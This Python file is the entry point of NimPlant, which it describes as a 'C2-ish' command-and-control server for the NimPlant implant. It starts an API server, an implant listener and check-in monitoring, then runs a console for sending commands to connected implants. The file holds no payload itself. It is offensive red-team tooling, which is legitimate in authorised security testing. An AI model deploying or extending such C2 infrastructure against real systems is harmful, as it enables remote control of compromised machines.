#!/usr/bin/python3

# -----
#
#   NimPlant Server - The "C2-ish"™ handler for the NimPlant payload
#   By Cas van Cooten (@chvancooten)
#
# -----

import threading
import time

from server.api.server import (
    api_server,
    server_ip,
    server_port,
)
from server.util.db import (
    initialize_database,
    db_initialize_server,
    db_is_previous_server_same_config,
)
from server.util.func import (
    exit_server_console,
    nimplant_print,
    periodic_nimplant_checks,
)
from server.util.listener import (
    flask_listener,
    listener_type,
    listener_ip,
    listener_port,
)
from server.util.nimplant import np_server
from server.util.input import prompt_user_for_command


def main(xor_key=459457925, name=""):
    # Initialize the SQLite database
    initialize_database()

    # Restore the previous server session if config remains unchanged
    # Otherwise, initialize a new server session
    if db_is_previous_server_same_config(np_server, xor_key):
        nimplant_print("Existing server session found, restoring...")
        np_server.restore_from_db()
    else:
        np_server.initialize(name, xor_key)
        db_initialize_server(np_server)

    # Start daemonized Flask server for API communications
    t1 = threading.Thread(name="Listener", target=api_server)
    t1.setDaemon(True)
    t1.start()
    nimplant_print(f"Started management server on http://{server_ip}:{server_port}.")

    # Start another thread for NimPlant listener
    t2 = threading.Thread(name="Listener", target=flask_listener, args=(xor_key,))
    t2.setDaemon(True)
    t2.start()
    nimplant_print(
        f"Started NimPlant listener on {listener_type.lower()}://{listener_ip}:{listener_port}. CTRL-C to cancel waiting for NimPlants."
    )

    # Start another thread to periodically check if nimplants checked in on time
    t3 = threading.Thread(name="Listener", target=periodic_nimplant_checks)
    t3.setDaemon(True)
    t3.start()

    # Run the console as the main thread
    while True:
        try:
            if np_server.is_active_nimplant_selected():
                prompt_user_for_command()
            elif np_server.has_active_nimplants():
                np_server.get_next_active_nimplant()
            else:
                pass

            time.sleep(0.5)

        except KeyboardInterrupt:
            exit_server_console()
